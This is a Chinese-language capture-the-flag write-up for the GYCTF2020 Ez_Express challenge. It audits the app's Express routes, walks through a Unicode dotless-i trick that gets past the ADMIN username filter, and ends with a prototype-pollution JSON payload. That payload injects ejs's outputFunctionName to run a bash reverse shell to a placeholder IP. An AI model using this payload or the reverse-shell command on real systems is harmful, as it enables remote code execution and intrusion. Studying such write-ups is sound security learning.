# [GYCTF2020]Ez_Express
![](<./img/Pasted image 20230223233434.png>)

![](<./img/Pasted image 20230223233443.png>)

![](<./img/Pasted image 20230223233702.png>)

去掉杂七杂八的东西后大概是这么个结构

![](<./img/Pasted image 20230223235540.png>)

有用的貌似就一个`routes/index.js`

```javascript
var express = require('express');
var router = express.Router();
const isObject = obj => obj && obj.constructor && obj.constructor === Object;
const merge = (a, b) => {
    for (var attr in b) {
        if (isObject(a[attr]) && isObject(b[attr])) {
            merge(a[attr], b[attr]);
        } else {
            a[attr] = b[attr];
        }
    }
    return a
}
const clone = (a) => {
    return merge({}, a);
}
function safeKeyword(keyword) {
    if (keyword.match(/(admin)/is)) {
        return keyword
    }

    return undefined
}

router.get('/', function (req, res) {
    if (!req.session.user) {
        res.redirect('/login');
    }
    res.outputFunctionName = undefined;
    res.render('index', data = {'user': req.session.user.user});
});


router.get('/login', function (req, res) {
    res.render('login');
});



router.post('/login', function (req, res) {
    if (req.body.Submit == "register") {
        if (safeKeyword(req.body.userid)) {
            res.end("<script>alert('forbid word');history.go(-1);</script>")
        }
        req.session.user = {
            'user': req.body.userid.toUpperCase(),
            'passwd': req.body.pwd,
            'isLogin': false
        }
        res.redirect('/');
    }
    else if (req.body.Submit == "login") {
        if (!req.session.user) {res.end("<script>alert('register first');history.go(-1);</script>")}
        if (req.session.user.user == req.body.userid && req.body.pwd == req.session.user.passwd) {
            req.session.user.isLogin = true;
        }
        else {
            res.end("<script>alert('error passwd');history.go(-1);</script>")
        }

    }
    res.redirect('/');;
});
router.post('/action', function (req, res) {
    if (req.session.user.user != "ADMIN") {res.end("<script>alert('ADMIN is asked');history.go(-1);</script>")}
    req.session.user.data = clone(req.body);
    res.end("<script>alert('success');history.go(-1);</script>");
});
router.get('/info', function (req, res) {
    res.render('index', data = {'user': res.outputFunctionName});
})
module.exports = router;
```

首先就是这个喜闻乐见的`merge`函数了，构造原型链污染的好朋友🙏

使用`merge`来实现`clone`函数，而`clone`在`/action`路由中被使用

关注`/action`路由，发现在调用`clone`函数之前存在对当前用户名的判断，只有当用户名为ADMIN时才能继续

那就注册一个用户名为ADMIN的账号，然而，观察到处理注册的`/login`路由中调用了`safeKeyword`检查用户名合法性，而`safeKeyword`恰恰ban掉了ADMIN

正则表达式和字符串比较应该是没有什么空子可以钻了，但是走的肯定是`/action`这条路，除非出题人真的做好了结束后被选手暴打一顿的准备（

继续审计注册相关逻辑，发现注册成功时向`session`写入的用户名经过了`toUpperCase`的处理以确保全为大写

结合首页的用户名只支持大写的提示，判断突破口在于`toUpperCase`相关的处理

然后就找到了[这篇文章](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)

![](<./img/Pasted image 20230224005515.png>)

![](<./img/Pasted image 20230224005810.png>)

在Unicode的小写字母分类中也找到了这个玩意，它的大写正好是拉丁大写字母`I`，通过这玩意就可以绕过注册时的正则判断啦

```
username: admın
password: 
```


![](<./img/Pasted image 20230224010341.png>)

然后就可以构造原型链污染啦

![](<./img/Pasted image 20230224010553.png>)

出题人大大贴心地设置了`/info`路由，把`outputFunctionName`写在了里面，明示`ejs`的漏洞

![](<./img/Pasted image 20230224010824.png>)

`ejs`的版本也印证了这一点

```json
{
	"__proto__": {
		"outputFunctionName": "x;process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1\"');s"
	}
}
```

![](<./img/Pasted image 20230224014908.png>)

再重新`GET`一次让payload编译进模板

![](<./img/Pasted image 20230224015015.png>)

![](<./img/Pasted image 20230224014653.png>)
